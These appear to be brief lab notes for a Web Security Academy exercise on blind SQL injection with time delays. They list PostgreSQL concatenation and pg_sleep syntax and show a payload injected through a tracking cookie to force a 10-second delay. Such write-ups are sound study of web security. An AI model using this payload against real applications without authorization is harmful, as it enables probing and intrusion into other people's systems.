# Blind SQL injection with time delays

1. SQLi: tracking cookie.
2. Goal: exploit the SQL injection vulnerability to cause a 10 second delay.

### Analysis
- Web target: `https://0a6c003c0458f04b80c0b2a400d50088.web-security-academy.net/`
- Use Burp suite.
- `ctrl + u`: URL encode.

```sql
--String concatenation
--PostgreSQL: ||

--Conditional time delays
--PostgreSQL: SELECT pg_sleep(10)

select tracking-id from tracking-table where trackingId='sanYkWrb9RW2mvzW'|| (select pg_sleep(10))--';
```